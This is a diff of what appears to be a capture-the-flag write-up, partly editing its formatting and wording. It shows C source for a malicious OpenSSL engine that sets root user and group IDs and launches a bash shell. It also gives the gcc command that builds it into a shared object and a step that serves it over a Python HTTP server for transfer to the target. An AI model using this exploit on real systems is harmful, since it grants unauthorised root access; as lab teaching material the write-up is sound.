@@ -125,24 +125,15 @@ thm{******38247ff441ce4e13**********}
 
 ```
 #include <openssl/engine.h>
-
-
 #include <unistd.h>
 
-
 static int bind(ENGINE *e, const char *id) {
-
     setuid(0); 
-    
     setgid(0);
-    
     system("/bin/bash");
-
-    
 }
 
 IMPLEMENT_DYNAMIC_BIND_FN(bind)
-
 IMPLEMENT_DYNAMIC_CHECK_FN()"
 ```
 
@@ -165,8 +156,9 @@ IMPLEMENT_DYNAMIC_CHECK_FN()"
 `gcc -shared -o exploit.so -lcrypto exploit.o`
 
 
-+ we want to transfer this to the target machine so we can execute the binary
+# we transfer the exploit to the target machine so we can execute the binary
 
++ start up a python server on your attacker machine
 
 `python3 -m http.server 8000`
 
